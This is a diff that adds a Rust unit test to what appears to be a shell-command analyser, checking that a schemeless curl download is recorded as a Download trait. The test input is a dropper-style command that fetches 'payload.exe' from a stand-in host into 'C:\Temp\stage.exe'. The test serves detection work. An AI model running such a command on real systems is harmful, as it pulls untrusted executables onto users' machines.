@@ -5879,6 +5879,23 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_schemeless_domain_path_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.exe curl-schemeless.example/payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: Some(d), .. }
+                    if src == "http://curl-schemeless.example/payload.exe"
+                        && d == r#"C:\Temp\stage.exe"#
+            )
+        });
+        assert!(has, "traits: {:?}", env.traits);
+    }
+
+    #[test]
     fn curl_without_output_records_src_only() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl http://x/y", &mut env);
